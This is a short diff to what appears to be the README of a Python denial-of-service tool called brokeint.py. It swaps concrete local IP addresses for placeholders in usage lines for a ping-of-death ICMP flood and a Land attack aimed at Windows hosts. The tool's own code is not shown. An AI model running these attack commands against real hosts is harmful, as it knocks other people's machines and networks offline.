@@ -33,8 +33,8 @@ python3 brokeint.py -M -iface Wi-Fi`
 
 ### Ping of death sends ICMP pings to the target and performs a DOS attack
 
-`python3 brokeint.py ip 192.168.112 -d 150 -C 10000 -iface Wi-Fi`
+`python3 brokeint.py ip <target_ip> -d 150 -C 10000 -iface Wi-Fi`
 
 ### Land attack (designed for Microsoft Windows): performs a DOS attack by making the attack on the local network
 
-`python3 brokeint.py -sI 192.168.1.113 -dI 192.168.1.112 -C 1000`
+`python3 brokeint.py -sI <source_ip> -dI <destination_ip> -C 1000`
